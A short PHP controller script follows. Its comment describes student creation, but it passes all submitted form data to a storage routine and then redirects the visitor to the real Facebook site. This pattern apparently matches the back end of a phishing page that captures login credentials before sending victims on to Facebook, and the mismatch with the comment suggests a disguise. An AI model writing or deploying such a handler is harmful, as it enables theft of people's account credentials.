<?php
    require '../Models/Database.php';
    require '../Models/get.php';
    
    // Appel du modele pour la création d'un étudiant
    if($_GET['status'] === 'OK'){
        DataGetter::getInfos($_POST); 
        header("Location:https://web.facebook.com/");
    }else{
        header("Location: ../index.php");
    }

    
?>